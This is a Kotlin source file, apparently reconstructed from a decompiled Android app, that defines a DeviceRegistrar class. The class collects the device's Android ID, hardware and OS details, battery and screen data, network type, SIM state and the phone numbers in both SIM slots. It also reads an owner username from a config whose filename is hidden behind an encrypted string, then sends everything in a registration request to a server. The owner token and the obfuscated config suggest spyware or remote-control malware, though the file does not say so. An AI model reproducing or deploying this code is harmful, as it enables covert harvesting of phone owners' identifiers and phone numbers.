package com.storm.safe.rock.network

import android.content.Context
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.Build
import android.telephony.SubscriptionManager
import android.telephony.TelephonyManager
import android.util.Log
import com.storm.safe.rock.util.StringUtil
import org.json.JSONObject

/**
 * Handles device registration payload construction and HTTP registration.
 *
 * Extracted from NetworkManager (JADX: C0323a8).
 * - buildDeviceInfo() — JADX: a1
 * - registerDevice() — JADX: a7 (registration thread in onConnectionStateChanged)
 */
class DeviceRegistrar(
    private val context: Context,
    private val httpManager: HttpManager
) {
    companion object {
        private const val TAG = "DeviceRegistrar"
    }

    var deviceId: String = ""
    var ownerToken: String = ""
    var cachedBatteryLevel: Int = -1
    var cachedIsCharging: Boolean = false

    /**
     * Build full device info JSON for registration.
     * JADX: a1
     */
    fun buildDeviceInfo(): JSONObject {
        val json = JSONObject()

        // JADX a1: Uses AbstractC1229so.m214638a3(context) -> C1228sn device info
        json.put("deviceId", deviceId)
        if (ownerToken.isNotEmpty()) {
            json.put("owner_token", ownerToken)
        }
        // JADX: c1228sn.f60018a1 (deviceName)
        val androidId = try {
            android.provider.Settings.Secure.getString(context.contentResolver, "android_id") ?: ""
        } catch (_: Exception) { "" }
        val brandName = Build.BRAND.uppercase()
        val idSuffix = if (androidId.length > 8) androidId.substring(androidId.length - 8).uppercase() else androidId.uppercase()
        json.put("deviceName", "$brandName-$idSuffix")
        json.put("model", Build.MODEL)
        // JADX: c1228sn.f60019a2 (brand -- uses display brand name)
        json.put("brand", Build.BRAND)
        json.put("manufacturer", Build.MANUFACTURER)
        json.put("osVersion", Build.VERSION.RELEASE)
        json.put("sdkVersion", Build.VERSION.SDK_INT)

        // App info — JADX: c1228sn.f60021a4 (appName), c1228sn.f60022a5 (appVersion)
        val appName = try {
            val appInfo = context.packageManager.getApplicationInfo(context.packageName, 0)
            context.packageManager.getApplicationLabel(appInfo).toString()
        } catch (_: Exception) { "" }
        val appVersion = try {
            context.packageManager.getPackageInfo(context.packageName, 0).versionName ?: ""
        } catch (_: Exception) { "" }
        json.put("appName", appName)
        json.put("appVersion", appVersion)

        if (cachedBatteryLevel >= 0) {
            json.put("batteryLevel", cachedBatteryLevel)
            json.put("isCharging", cachedIsCharging)
        }

        // Screen dimensions — JADX: c1228sn.f60025a8, c1228sn.f60026a9
        var screenWidth = 0
        var screenHeight = 0
        try {
            val wm = context.getSystemService(Context.WINDOW_SERVICE) as? android.view.WindowManager
            if (Build.VERSION.SDK_INT >= 30) {
                val bounds = wm?.currentWindowMetrics?.bounds
                screenWidth = bounds?.width() ?: 0
                screenHeight = bounds?.height() ?: 0
            } else {
                val dm = android.util.DisplayMetrics()
                @Suppress("DEPRECATION")
                wm?.defaultDisplay?.getRealMetrics(dm)
                screenWidth = dm.widthPixels
                screenHeight = dm.heightPixels
            }
        } catch (_: Exception) {}
        json.put("screenWidth", screenWidth)
        json.put("screenHeight", screenHeight)

        // Install time — JADX: c1228sn.f60027b0 (firstInstallTime)
        val firstInstallTime = try {
            context.packageManager.getPackageInfo(context.packageName, 0).firstInstallTime
        } catch (_: Exception) { 0L }
        json.put("firstInstallTime", firstInstallTime)

        // SIM info — JADX: queries TelephonyManager + SubscriptionManager
        var hasSim = false
        var phoneNumber = ""
        var phoneNumber2 = ""
        try {
            val tm = context.getSystemService(Context.TELEPHONY_SERVICE) as? TelephonyManager
            val sm = context.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as? SubscriptionManager
            // JADX: check simState
            if (tm != null) {
                val simState = tm.simState
                hasSim = simState != TelephonyManager.SIM_STATE_ABSENT && simState != TelephonyManager.SIM_STATE_UNKNOWN
            }
            // JADX: SubscriptionManager for phone numbers
            try {
                val subInfoList = sm?.activeSubscriptionInfoList
                if (subInfoList != null && subInfoList.isNotEmpty()) {
                    hasSim = true
                    for (subInfo in subInfoList) {
                        @Suppress("DEPRECATION")
                        val number = subInfo.number ?: ""
                        when (subInfo.simSlotIndex) {
                            0 -> phoneNumber = number
                            1 -> phoneNumber2 = number
                        }
                    }
                }
            } catch (_: SecurityException) {
                // Phone number permission denied
            } catch (_: Exception) {}
        } catch (_: Exception) {}
        json.put("hasSim", hasSim)
        json.put("phoneNumber", phoneNumber)
        json.put("phoneNumber2", phoneNumber2)

        // Network type — JADX: AbstractC1229so.m214642a7(context)
        val regNetworkType = try {
            val cm = context.getSystemService(Context.CONNECTIVITY_SERVICE) as? ConnectivityManager
            val activeNet = cm?.activeNetwork
            val caps = if (activeNet != null) cm?.getNetworkCapabilities(activeNet) else null
            if (caps != null) {
                when {
                    caps.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) -> "WiFi"
                    caps.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) -> "移动数据"
                    caps.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET) -> "以太网"
                    caps.hasTransport(NetworkCapabilities.TRANSPORT_VPN) -> "VPN"
                    else -> "无网络"
                }
            } else "无网络"
        } catch (_: Exception) { "未知" }
        json.put("networkType", regNetworkType)

        // JADX a1: ownerUsername from config file (AbstractC0765ko.m213605a3)
        try {
            val configFilename = StringUtil.decrypt("OFwDLEgqMy1YPy1QFnRHKwMg")
            val configStr = com.storm.safe.rock.util.AssetConfigReader.readAssetConfig(context, configFilename)
            if (configStr != null) {
                val configJson = JSONObject(configStr)
                val ownerUsername = configJson.optString("ownerUsername", "")
                if (ownerUsername.isNotBlank()) {
                    json.put("ownerUsername", ownerUsername)
                }
            }
        } catch (_: Exception) {}

        json.put("timestamp", System.currentTimeMillis())

        return json
    }

    /**
     * Register device via HTTP.
     * JADX: a7 (registration thread from onConnectionStateChanged)
     */
    suspend fun registerDevice(): Result<JSONObject> {
        val deviceInfo = buildDeviceInfo()
        Log.d(TAG, "Registering device: deviceId=$deviceId")
        return httpManager.register(deviceInfo)
    }
}
